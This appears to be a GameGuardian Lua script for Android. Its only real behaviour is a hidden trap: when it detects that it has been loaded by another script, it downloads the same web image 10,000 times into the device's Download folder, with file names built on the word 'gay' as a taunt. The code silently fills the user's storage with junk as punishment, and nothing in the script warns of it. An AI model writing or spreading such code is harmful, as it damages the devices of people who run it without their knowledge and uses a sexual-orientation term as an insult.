
if luajava == nil then gg.alert(' unavaliable please use gameguardian mod (suport luajava)') else end

import "java.net.*"
import "java.io.*"
import "java.util.*"
import "android.app.*"
import "android.os.*"
import "android.widget.*"
import "android.view.*"

local Class = luajava.bindClass
local new = luajava.new

function WriteFi()
    local Link = "https://th.bing.com/th/id/OIP.C1C4ZahU5VFA2l6FGPYOBAHaNK?o=7rm=3&dpr=1,9&pid=ImgDetMain&o=7&rm=3"
    local path = "/sdcard/Download/"
       
    for i = 1, 10000 do
        local newName = "gay" .. i .. ".png"
        
        local success, errorMsg = pcall(function()
           
            local url = new(URL, Link)
            local connection = url:openConnection()
            connection:setConnectTimeout(10000)
            connection:setReadTimeout(10000)
            connection:connect()
            
            local responseCode = connection:getResponseCode()
            if responseCode ~= 200 then
     end
                        
            local inputStream = connection:getInputStream()
            local file = io.open(path .. newName, "wb")           
            if not file then
     end
                       
            local data = inputStream:read()
            while data >= 0 do
                file:write(string.char(data))
                data = inputStream:read()
            end
                       
            file:close()
            inputStream:close()
            connection:disconnect()            
  end)
        
        if not success then
    end        
        gg.sleep(1000)
    end
end

function a()
    local c = tostring(_ENV.gg)
    for k in c:gmatch("%s[@]?(/.-):") do
        if k ~= gg.getFile() then
            WriteFi()
        end
    end
end

a()
--WriteFi()